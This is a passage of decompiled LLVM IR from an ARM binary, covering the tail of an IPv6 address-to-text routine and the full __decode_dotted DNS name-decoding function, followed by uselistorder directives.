  br i1 %v7_1cbfc, label %dec_label_pc_1cbfc._crit_edge, label %dec_label_pc_1cc04

dec_label_pc_1cc04:                               ; preds = %dec_label_pc_1cbfc
  %v7_1cc04 = icmp eq i32 %v1_1cc1c.pre, 1
  store i1 %v7_1cc04, i1* %cpsr_z.global-to-local, align 1
  %v7_1cc08 = icmp slt i32 %v1_1cc1c.pre, 2
  br i1 %v7_1cc08, label %bb53, label %dec_label_pc_1cbfc._crit_edge

bb53:                                             ; preds = %dec_label_pc_1cc04
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1cbfc._crit_edge

dec_label_pc_1cbfc._crit_edge:                    ; preds = %dec_label_pc_1cbfc, %dec_label_pc_1cc04, %bb53
  %v0_1cc1c = phi i32 [ %v0_1cbfc, %dec_label_pc_1cc04 ], [ -1, %bb53 ], [ %v0_1cbfc, %dec_label_pc_1cbfc ]
  store i32 65535, i32* @fp, align 4
  %v2_1cc10 = ptrtoint i32* %stack_var_-114 to i32
  store i32 %v2_1cc10, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 58, i32* @sb, align 4
  %v2_1cc1c = add i32 %v0_1cc1c, %v1_1cc1c.pre
  store i32 %v2_1cc1c, i32* @sl, align 4
  %v7_1cc2466 = icmp eq i32 %v0_1cc1c, -1
  store i1 %v7_1cc2466, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1cc24

dec_label_pc_1cc24:                               ; preds = %dec_label_pc_1cbfc._crit_edge, %dec_label_pc_1ccd0
  %v7_1cc2470 = phi i1 [ %v7_1cc2466, %dec_label_pc_1cbfc._crit_edge ], [ %v7_1cc24, %dec_label_pc_1ccd0 ]
  %v0_1cc5069 = phi i32 [ 0, %dec_label_pc_1cbfc._crit_edge ], [ %v1_1ccd0, %dec_label_pc_1ccd0 ]
  %v1_1cc3c68 = phi i32 [ %v0_1cc1c, %dec_label_pc_1cbfc._crit_edge ], [ %v0_1cc24.pre, %dec_label_pc_1ccd0 ]
  %v2_1cc5467 = phi i32 [ %v2_1cc10, %dec_label_pc_1cbfc._crit_edge ], [ %v3_1cc4029, %dec_label_pc_1ccd0 ]
  br i1 %v7_1cc2470, label %dec_label_pc_1cc48, label %dec_label_pc_1cc2c

dec_label_pc_1cc2c:                               ; preds = %dec_label_pc_1cc24
  %v9_1cc2c = icmp eq i32 %v0_1cc5069, %v1_1cc3c68
  store i1 %v9_1cc2c, i1* %cpsr_z.global-to-local, align 1
  %v5_1cc30 = icmp slt i32 %v0_1cc5069, %v1_1cc3c68
  br i1 %v5_1cc30, label %dec_label_pc_1cc48, label %dec_label_pc_1cc34

dec_label_pc_1cc34:                               ; preds = %dec_label_pc_1cc2c
  %v1_1cc34 = load i32, i32* @sl, align 4
  %v9_1cc34 = icmp eq i32 %v0_1cc5069, %v1_1cc34
  store i1 %v9_1cc34, i1* %cpsr_z.global-to-local, align 1
  %v6_1cc38 = icmp slt i32 %v0_1cc5069, %v1_1cc34
  br i1 %v6_1cc38, label %dec_label_pc_1cc3c, label %dec_label_pc_1cc48

dec_label_pc_1cc3c:                               ; preds = %dec_label_pc_1cc34
  store i1 %v9_1cc2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1cc2c, label %bb54, label %dec_label_pc_1ccd0

bb54:                                             ; preds = %dec_label_pc_1cc3c
  %v1_1cc40 = load i32, i32* @sb, align 4
  %v2_1cc40 = trunc i32 %v1_1cc40 to i8
  %v4_1cc40 = inttoptr i32 %v2_1cc5467 to i8*
  store i8 %v2_1cc40, i8* %v4_1cc40, align 1
  %v5_1cc40 = load i32, i32* @r4, align 4
  %v6_1cc40 = add i32 %v5_1cc40, 1
  store i32 %v6_1cc40, i32* @r4, align 4
  br label %dec_label_pc_1ccd0

dec_label_pc_1cc48:                               ; preds = %dec_label_pc_1cc34, %dec_label_pc_1cc2c, %dec_label_pc_1cc24
  %v2_1cc48 = icmp eq i32 %v0_1cc5069, 0
  store i1 %v2_1cc48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1cc48, label %dec_label_pc_1ccb4, label %dec_label_pc_1cc50

dec_label_pc_1cc50:                               ; preds = %dec_label_pc_1cc48
  %v7_1cc50 = icmp eq i32 %v0_1cc5069, 6
  store i1 %v7_1cc50, i1* %cpsr_z.global-to-local, align 1
  %v0_1cc54 = load i32, i32* @sb, align 4
  %v1_1cc54 = trunc i32 %v0_1cc54 to i8
  %v3_1cc54 = inttoptr i32 %v2_1cc5467 to i8*
  store i8 %v1_1cc54, i8* %v3_1cc54, align 1
  %v4_1cc54 = load i32, i32* @r4, align 4
  %v5_1cc54 = add i32 %v4_1cc54, 1
  store i32 %v5_1cc54, i32* @r4, align 4
  %v0_1cc58 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1cc58, label %dec_label_pc_1cc5c, label %dec_label_pc_1ccb4

dec_label_pc_1cc5c:                               ; preds = %dec_label_pc_1cc50
  %v0_1cc5c = load i32, i32* @r6, align 4
  %v2_1cc5c = icmp eq i32 %v0_1cc5c, 0
  store i1 %v2_1cc5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1cc5c, label %dec_label_pc_1cc64, label %dec_label_pc_1ccb4

dec_label_pc_1cc64:                               ; preds = %dec_label_pc_1cc5c
  %v0_1cc64 = load i32, i32* @r7, align 4
  %v7_1cc64 = icmp eq i32 %v0_1cc64, 6
  store i1 %v7_1cc64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1cc64, label %dec_label_pc_1cc80, label %dec_label_pc_1cc6c

dec_label_pc_1cc6c:                               ; preds = %dec_label_pc_1cc64
  %v7_1cc6c = icmp eq i32 %v0_1cc64, 5
  store i1 %v7_1cc6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1cc6c, label %dec_label_pc_1cc74, label %dec_label_pc_1ccb4

dec_label_pc_1cc74:                               ; preds = %dec_label_pc_1cc6c
  %v1_1cc78 = load i32, i32* @fp, align 4
  %v9_1cc78 = icmp eq i32 %tmp, %v1_1cc78
  store i1 %v9_1cc78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1cc78, label %dec_label_pc_1cc80, label %dec_label_pc_1ccb4

dec_label_pc_1cc80:                               ; preds = %dec_label_pc_1cc74, %dec_label_pc_1cc64
  %v2_1cc84 = sub i32 %v28_1caec, %v5_1cc54
  %v1_1cc88 = add i32 %v2_1cc84, -32
  store i32 %v1_1cc88, i32* %r2.global-to-local, align 4
  %v0_1cc8c = load i32, i32* @r8, align 4
  %v1_1cc8c = add i32 %v0_1cc8c, 12
  store i32 %v1_1cc8c, i32* %r0.global-to-local, align 4
  %v3_1cc94 = call i32 @inet_ntop4(i32 %v1_1cc8c, i32 %v5_1cc54, i32 %v1_1cc88)
  store i32 %v3_1cc94, i32* %r0.global-to-local, align 4
  %v2_1cc98 = icmp eq i32 %v3_1cc94, 0
  store i1 %v2_1cc98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1cc98, label %bb55, label %dec_label_pc_1cca4

bb55:                                             ; preds = %dec_label_pc_1cc80
  %v1_1cc9c = load i32, i32* @r6, align 4
  store i32 %v1_1cc9c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1cd44

dec_label_pc_1cca4:                               ; preds = %dec_label_pc_1cc80
  %v0_1cca4 = load i32, i32* @r4, align 4
  %v1_1cca4 = inttoptr i32 %v0_1cca4 to i8*
  store i32 %v0_1cca4, i32* %r0.global-to-local, align 4
  %v3_1cca8 = call i32 @strlen(i8* %v1_1cca4)
  store i32 %v3_1cca8, i32* %r0.global-to-local, align 4
  %v0_1ccac = load i32, i32* @r4, align 4
  %v2_1ccac = add i32 %v0_1ccac, %v3_1cca8
  store i32 %v2_1ccac, i32* @r4, align 4
  %v0_1cce4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1cce4

dec_label_pc_1ccb4:                               ; preds = %dec_label_pc_1cc74, %dec_label_pc_1cc6c, %dec_label_pc_1cc5c, %dec_label_pc_1cc50, %dec_label_pc_1cc48
  %v0_1ccbc = phi i32 [ %v5_1cc54, %dec_label_pc_1cc74 ], [ %v5_1cc54, %dec_label_pc_1cc6c ], [ %v5_1cc54, %dec_label_pc_1cc5c ], [ %v5_1cc54, %dec_label_pc_1cc50 ], [ %v2_1cc5467, %dec_label_pc_1cc48 ]
  store i32 %v28_1caec, i32* %r2.global-to-local, align 4
  %v1_1ccb8 = load i32, i32* @r5, align 4
  %v4_1ccb8 = mul i32 %v1_1ccb8, 4
  %v5_1ccb8 = add i32 %v4_1ccb8, %v28_1caec
  store i32 %v0_1ccbc, i32* @r0, align 4
  %v1_1ccc0 = add i32 %v5_1ccb8, -32
  %v2_1ccc0 = inttoptr i32 %v1_1ccc0 to i32*
  %v3_1ccc0 = load i32, i32* %v2_1ccc0, align 4
  store i32 %v3_1ccc0, i32* %r2.global-to-local, align 4
  %v3_1ccc8 = call i32 @sprintf(i32 %v0_1ccbc, i32 ptrtoint ([3 x i8]* @global_var_25730.1711 to i32))
  store i32 %v3_1ccc8, i32* %r0.global-to-local, align 4
  %v0_1cccc = load i32, i32* @r4, align 4
  %v2_1cccc = add i32 %v0_1cccc, %v3_1ccc8
  store i32 %v2_1cccc, i32* @r4, align 4
  br label %dec_label_pc_1ccd0

dec_label_pc_1ccd0:                               ; preds = %bb54, %dec_label_pc_1cc3c, %dec_label_pc_1ccb4
  %v3_1cc4029 = phi i32 [ %v6_1cc40, %bb54 ], [ %v2_1cc5467, %dec_label_pc_1cc3c ], [ %v2_1cccc, %dec_label_pc_1ccb4 ]
  %v0_1ccd0 = load i32, i32* @r5, align 4
  %v1_1ccd0 = add i32 %v0_1ccd0, 1
  store i32 %v1_1ccd0, i32* @r5, align 4
  %v0_1cc24.pre = load i32, i32* @r6, align 4
  %v7_1ccd8 = icmp slt i32 %v1_1ccd0, 8
  %v7_1cc24 = icmp eq i32 %v0_1cc24.pre, -1
  store i1 %v7_1cc24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ccd8, label %dec_label_pc_1cc24, label %dec_label_pc_1ccdc

dec_label_pc_1ccdc:                               ; preds = %dec_label_pc_1ccd0
  br i1 %v7_1cc24, label %.thread2, label %dec_label_pc_1cce4

dec_label_pc_1cce4:                               ; preds = %dec_label_pc_1ccdc, %dec_label_pc_1cca4
  %v3_1ccf0 = phi i32 [ %v3_1cc4029, %dec_label_pc_1ccdc ], [ %v2_1ccac, %dec_label_pc_1cca4 ]
  %v0_1cce4 = phi i32 [ %v0_1cc24.pre, %dec_label_pc_1ccdc ], [ %v0_1cce4.pre, %dec_label_pc_1cca4 ]
  %v1_1cce4 = load i32, i32* @r7, align 4
  %v2_1cce4 = add i32 %v1_1cce4, %v0_1cce4
  %v7_1cce8 = icmp eq i32 %v2_1cce4, 8
  store i1 %v7_1cce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1cce8, label %bb56, label %.thread2

bb56:                                             ; preds = %dec_label_pc_1cce4
  %v4_1ccf0 = inttoptr i32 %v3_1ccf0 to i8*
  store i8 58, i8* %v4_1ccf0, align 1
  %v5_1ccf0 = load i32, i32* @r4, align 4
  %v6_1ccf0 = add i32 %v5_1ccf0, 1
  store i32 %v6_1ccf0, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1cce4, %dec_label_pc_1ccdc, %bb56
  %v2_1ccf8 = phi i32 [ %v3_1ccf0, %dec_label_pc_1cce4 ], [ %v3_1cc4029, %dec_label_pc_1ccdc ], [ %v6_1ccf0, %bb56 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1ccf8 = inttoptr i32 %v2_1ccf8 to i8*
  store i8 0, i8* %v3_1ccf8, align 1
  %v4_1ccf8 = load i32, i32* @r4, align 4
  %v5_1ccf8 = add i32 %v4_1ccf8, 1
  store i32 %v2_1cc10, i32* @r1, align 4
  %v2_1cd00 = load i32, i32* %stack_var_-124, align 4
  %v2_1cd04 = sub i32 %v5_1ccf8, %v2_1cc10
  %v9_1cd08 = icmp eq i32 %v2_1cd04, %v2_1cd00
  store i1 %v9_1cd08, i1* %cpsr_z.global-to-local, align 1
  %tmp73 = icmp ugt i32 %v2_1cd04, %v2_1cd00
  br i1 %tmp73, label %dec_label_pc_1cd10, label %dec_label_pc_1cd24

dec_label_pc_1cd10:                               ; preds = %.thread2
  %v0_1cd10 = call i32 @__GI___errno_location()
  store i32 %v0_1cd10, i32* %r0.global-to-local, align 4
  %v0_1cd18 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1cd18, i32* %r2.global-to-local, align 4
  %v2_1cd1c = inttoptr i32 %v0_1cd10 to i32*
  store i32 28, i32* %v2_1cd1c, align 4
  %v0_1cd44.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1cd44

dec_label_pc_1cd24:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1cd28 = inttoptr i32 %arg3 to i8*
  %v3_1cd28 = call i32 @strcpy(i8* %v2_1cd28, i32 %v2_1cc10)
  br label %dec_label_pc_1cd2c

dec_label_pc_1cd2c:                               ; preds = %dec_label_pc_1cb14, %dec_label_pc_1cd24
  %storemerge = phi i32 [ %v3_1cb20, %dec_label_pc_1cb14 ], [ %v3_1cd28, %dec_label_pc_1cd24 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1cd44

dec_label_pc_1cd34:                               ; preds = %dec_label_pc_1cb08
  %v0_1cd34 = call i32 @__GI___errno_location()
  store i32 %v0_1cd34, i32* %r0.global-to-local, align 4
  %v2_1cd3c = inttoptr i32 %v0_1cd34 to i32*
  store i32 97, i32* %v2_1cd3c, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1cd44

dec_label_pc_1cd44:                               ; preds = %bb55, %dec_label_pc_1cd2c, %dec_label_pc_1cd10, %dec_label_pc_1cd34
  %v0_1cd44 = phi i32 [ %v1_1cc9c, %bb55 ], [ %storemerge, %dec_label_pc_1cd2c ], [ %v0_1cd44.pre, %dec_label_pc_1cd10 ], [ 0, %dec_label_pc_1cd34 ]
  store i32 %v0_1cd44, i32* %r0.global-to-local, align 4
  store i32 %v6_1caec, i32* %r5.global-to-local, align 4
  ret i32 %v0_1cd44

; uselistorder directives
  uselistorder i32 %v0_1cd44, { 1, 0 }
  uselistorder i1 %v7_1cc24, { 2, 0, 1 }
  uselistorder i32 %v0_1cc24.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1ccd0, { 0, 2, 1 }
  uselistorder i32 %v0_1ccbc, { 1, 0 }
  uselistorder i32 %v0_1cca4, { 1, 0 }
  uselistorder i32 %v5_1cc54, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_1cc2c, { 1, 0, 2 }
  uselistorder i32 %v2_1cc5467, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1cc5069, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_1cc2466, { 1, 0 }
  uselistorder i32 %v2_1cc10, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_1cc1c, { 1, 0, 2 }
  uselistorder i1 %v7_1cbfc, { 1, 0 }
  uselistorder i32 %v0_1cbfc, { 1, 2, 0 }
  uselistorder i32 %v1_1cc1c.pre, { 2, 0, 1 }
  uselistorder i32 %v0_1cbf4.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_1cbe4, { 1, 0 }
  uselistorder i1 %v7_1cbdc, { 1, 0 }
  uselistorder i32 %v1_1cbd0, { 1, 0 }
  uselistorder i32 %v0_1cbe4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1cbf8, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1cb98, { 1, 0 }
  uselistorder i32 %v0_1cbd0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1cbb4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1cbc4, { 3, 1, 0, 2 }
  uselistorder i32 %v1_1cb54, { 1, 0, 2 }
  uselistorder i32 %v2_1cb3c, { 1, 0 }
  uselistorder i32 %v0_1cb54, { 3, 1, 0, 2 }
  uselistorder i32 %v28_1caec, { 0, 4, 3, 1, 5, 2 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 16, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 14, 13, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 22, 14, 15, 16, 17, 18, 23, 19, 20, 21 }
  uselistorder i32 97, { 5, 6, 8, 0, 1, 9, 7, 2, 3, 4 }
  uselistorder i8 58, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @sprintf, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1cd44, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1cd2c, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ccd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1cc24, { 1, 0 }
  uselistorder label %dec_label_pc_1cbfc._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1cbfc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1cbf4, { 1, 0 }
  uselistorder label %dec_label_pc_1cbd0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1cbcc, { 1, 0 }
  uselistorder label %dec_label_pc_1cb84, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_1cd58 = load i32, i32* @r5, align 4
  %v0_1cd5c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1cd5c, i32* %sl.global-to-local, align 4
  %v2_1cd5c = icmp eq i32 %v0_1cd5c, 0
  br i1 %v2_1cd5c, label %.thread30, label %dec_label_pc_1cd84.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1ce44

dec_label_pc_1cd84.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1cd844 = load i32, i32* @r1, align 4
  %v6_1cd8814 = icmp slt i32 %v0_1cd844, %arg2
  br i1 %v6_1cd8814, label %dec_label_pc_1cd8c.preheader, label %dec_label_pc_1ce44

dec_label_pc_1cd8c.preheader:                     ; preds = %dec_label_pc_1cd84.preheader
  %v2_1cd8c50 = add i32 %v0_1cd5c, %v0_1cd844
  %v3_1cd8c51 = inttoptr i32 %v2_1cd8c50 to i8*
  %v4_1cd8c52 = load i8, i8* %v3_1cd8c51, align 1
  %v6_1cd8c53 = zext i8 %v4_1cd8c52 to i32
  store i32 %v6_1cd8c53, i32* @r4, align 4
  %v2_1cd9054 = icmp eq i8 %v4_1cd8c52, 0
  br i1 %v2_1cd9054, label %bb48, label %dec_label_pc_1cd98

dec_label_pc_1cd80:                               ; preds = %bb47, %bb43
  %v1_1cd84 = phi i32 [ %v1_1cd84.pre, %bb47 ], [ %v1_1cdb058, %bb43 ]
  %v0_1cd84 = phi i32 [ %v0_1cd84.pre, %bb47 ], [ %v5_1cdc8, %bb43 ]
  %v0_1cd80 = phi i32 [ %v0_1cd80.pre, %bb47 ], [ %v0_1cdcc59, %bb43 ]
  store i32 %v0_1cd80, i32* %r0.global-to-local, align 4
  %v6_1cd88 = icmp slt i32 %v0_1cd84, %v1_1cd84
  br i1 %v6_1cd88, label %dec_label_pc_1cd80.dec_label_pc_1cd8c_crit_edge, label %dec_label_pc_1ce44

dec_label_pc_1cd80.dec_label_pc_1cd8c_crit_edge:  ; preds = %dec_label_pc_1cd80
  %v0_1cd8c.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_1cd8c = add i32 %v0_1cd8c.pre, %v0_1cd84
  %v3_1cd8c = inttoptr i32 %v2_1cd8c to i8*
  %v4_1cd8c = load i8, i8* %v3_1cd8c, align 1
  %v6_1cd8c = zext i8 %v4_1cd8c to i32
  store i32 %v6_1cd8c, i32* @r4, align 4
  %v2_1cd90 = icmp eq i8 %v4_1cd8c, 0
  %v0_1ce30 = load i32, i32* @ip, align 4
  %v2_1ce30 = icmp eq i32 %v0_1ce30, 0
  br i1 %v2_1cd90, label %dec_label_pc_1ce30, label %dec_label_pc_1cd98

dec_label_pc_1cd98:                               ; preds = %dec_label_pc_1cd8c.preheader, %dec_label_pc_1cd80.dec_label_pc_1cd8c_crit_edge
  %v2_1ce3065 = phi i1 [ %v2_1ce30, %dec_label_pc_1cd80.dec_label_pc_1cd8c_crit_edge ], [ false, %dec_label_pc_1cd8c.preheader ]
  %v0_1ce3063 = phi i32 [ %v0_1ce30, %dec_label_pc_1cd80.dec_label_pc_1cd8c_crit_edge ], [ 1, %dec_label_pc_1cd8c.preheader ]
  %v6_1cd8c62 = phi i32 [ %v6_1cd8c, %dec_label_pc_1cd80.dec_label_pc_1cd8c_crit_edge ], [ %v6_1cd8c53, %dec_label_pc_1cd8c.preheader ]
  %v0_1cdb861 = phi i32 [ %v0_1cd8c.pre, %dec_label_pc_1cd80.dec_label_pc_1cd8c_crit_edge ], [ %v0_1cd5c, %dec_label_pc_1cd8c.preheader ]
  %v0_1cda860 = phi i32 [ %v0_1cd84, %dec_label_pc_1cd80.dec_label_pc_1cd8c_crit_edge ], [ %v0_1cd844, %dec_label_pc_1cd8c.preheader ]
  %v0_1cdcc59 = phi i32 [ %v0_1cd80, %dec_label_pc_1cd80.dec_label_pc_1cd8c_crit_edge ], [ 0, %dec_label_pc_1cd8c.preheader ]
  %v1_1cdb058 = phi i32 [ %v1_1cd84, %dec_label_pc_1cd80.dec_label_pc_1cd8c_crit_edge ], [ %arg2, %dec_label_pc_1cd8c.preheader ]
  %v1_1cd9c = and i32 %v6_1cd8c62, 192
  br i1 %v2_1ce3065, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_1cd98
  %v1_1cda0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1cda0 = add i32 %v1_1cda0, 1
  store i32 %v2_1cda0, i32* %r8.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_1cd98, %bb
  %v2_1cda4 = icmp eq i32 %v1_1cd9c, 192
  %v1_1cda8 = add i32 %v0_1cda860, 1
  store i32 %v1_1cda8, i32* %r1.global-to-local, align 4
  br i1 %v2_1cda4, label %dec_label_pc_1cdb0, label %dec_label_pc_1cdd8

dec_label_pc_1cdb0:                               ; preds = %bb41
  %v6_1cdb4 = icmp slt i32 %v1_1cda8, %v1_1cdb058
  br i1 %v6_1cdb4, label %dec_label_pc_1cdb8, label %dec_label_pc_1ce44

dec_label_pc_1cdb8:                               ; preds = %dec_label_pc_1cdb0
  %v2_1cdb8 = add i32 %v1_1cda8, %v0_1cdb861
  %v3_1cdb8 = inttoptr i32 %v2_1cdb8 to i8*
  %v4_1cdb8 = load i8, i8* %v3_1cdb8, align 1
  %v6_1cdb8 = zext i8 %v4_1cdb8 to i32
  %v1_1cdc0 = urem i32 %v6_1cd8c62, 64
  br i1 %v2_1ce3065, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_1cdb8
  %v1_1cdc4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1cdc4 = add i32 %v1_1cdc4, 1
  store i32 %v2_1cdc4, i32* %r8.global-to-local, align 4
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_1cdb8, %bb42
  %v4_1cdc8 = mul nuw nsw i32 %v1_1cdc0, 256
  %v5_1cdc8 = or i32 %v6_1cdb8, %v4_1cdc8
  store i32 %v5_1cdc8, i32* %r1.global-to-local, align 4
  store i32 %v0_1cdcc59, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1cd80

dec_label_pc_1cdd8:                               ; preds = %bb41
  %v2_1cdd8 = add i32 %v6_1cd8c62, %v0_1cdcc59
  store i32 %v2_1cdd8, i32* %r6.global-to-local, align 4
  %v3_1cddc = load i32, i32* %stack_var_0, align 4
  %v1_1cde0 = add i32 %v2_1cdd8, 1
  store i32 %v1_1cde0, i32* %r7.global-to-local, align 4
  %v3_1cde4 = icmp ult i32 %v1_1cde0, %v3_1cddc
  br i1 %v3_1cde4, label %dec_label_pc_1cdec, label %dec_label_pc_1ce44

dec_label_pc_1cdec:                               ; preds = %dec_label_pc_1cdd8
  %v2_1cdec = add i32 %v6_1cd8c62, %v1_1cda8
  store i32 %v2_1cdec, i32* @r5, align 4
  %v3_1cdf0 = icmp ult i32 %v2_1cdec, %v1_1cdb058
  br i1 %v3_1cdf0, label %dec_label_pc_1cdf8, label %dec_label_pc_1ce44

dec_label_pc_1cdf8:                               ; preds = %dec_label_pc_1cdec
  %v2_1cdf8 = add i32 %v1_1cda8, %v0_1cdb861
  store i32 %v2_1cdf8, i32* @r1, align 4
  %v0_1cdfc = load i32, i32* %sb.global-to-local, align 4
  %v2_1cdfc = add i32 %v0_1cdfc, %v0_1cdcc59
  store i32 %v2_1cdfc, i32* @r0, align 4
  store i32 %v6_1cd8c62, i32* @r2, align 4
  %v0_1ce08 = call i32 @memcpy()
  store i32 %v0_1ce08, i32* %r0.global-to-local, align 4
  store i32 %v0_1ce3063, i32* @ip, align 4
  %v0_1ce10 = load i32, i32* %sl.global-to-local, align 4
  %v1_1ce10 = load i32, i32* @r5, align 4
  %v2_1ce10 = add i32 %v1_1ce10, %v0_1ce10
  %v3_1ce10 = inttoptr i32 %v2_1ce10 to i8*
  %v4_1ce10 = load i8, i8* %v3_1ce10, align 1
  %v2_1ce14 = icmp eq i32 %v0_1ce3063, 0
  br i1 %v2_1ce14, label %bb45, label %bb44

bb44:                                             ; preds = %dec_label_pc_1cdf8
  %v1_1ce18 = load i32, i32* %r8.global-to-local, align 4
  %v2_1ce18 = load i32, i32* @r4, align 4
  %v3_1ce18 = add i32 %v2_1ce18, %v1_1ce18
  store i32 %v3_1ce18, i32* %r8.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_1cdf8, %bb44
  %v2_1ce1c = icmp eq i8 %v4_1ce10, 0
  br i1 %v2_1ce1c, label %bb47, label %bb46

bb46:                                             ; preds = %bb45
  br label %bb47

bb47:                                             ; preds = %bb45, %bb46
  %v0_1ce28.off0 = phi i8 [ 0, %bb45 ], [ 46, %bb46 ]
  store i32 %v1_1ce10, i32* %r1.global-to-local, align 4
  %v2_1ce28 = load i32, i32* %sb.global-to-local, align 4
  %v3_1ce28 = load i32, i32* %r6.global-to-local, align 4
  %v4_1ce28 = add i32 %v3_1ce28, %v2_1ce28
  %v5_1ce28 = inttoptr i32 %v4_1ce28 to i8*
  store i8 %v0_1ce28.off0, i8* %v5_1ce28, align 1
  %v0_1cd80.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1cd84.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1cd84.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1cd80

dec_label_pc_1ce30:                               ; preds = %dec_label_pc_1cd80.dec_label_pc_1cd8c_crit_edge
  %v0_1ce38.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1ce30, label %dec_label_pc_1ce44, label %bb48

bb48:                                             ; preds = %dec_label_pc_1cd8c.preheader, %dec_label_pc_1ce30
  %v0_1ce38.pre68 = phi i32 [ %v0_1ce38.pre.pre, %dec_label_pc_1ce30 ], [ 0, %dec_label_pc_1cd8c.preheader ]
  %v2_1ce34 = add i32 %v0_1ce38.pre68, 1
  store i32 %v2_1ce34, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1ce44

dec_label_pc_1ce44:                               ; preds = %dec_label_pc_1cdec, %dec_label_pc_1cdd8, %dec_label_pc_1cdb0, %dec_label_pc_1cd80, %dec_label_pc_1ce30, %dec_label_pc_1cd84.preheader, %bb48, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_1ce34, %bb48 ], [ -1, %dec_label_pc_1cd84.preheader ], [ %v0_1ce38.pre.pre, %dec_label_pc_1ce30 ], [ -1, %dec_label_pc_1cdd8 ], [ -1, %dec_label_pc_1cdec ], [ -1, %dec_label_pc_1cd80 ], [ -1, %dec_label_pc_1cdb0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_1cd58, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1ce38.pre.pre, { 1, 0 }
  uselistorder i32 %v1_1ce10, { 1, 0 }
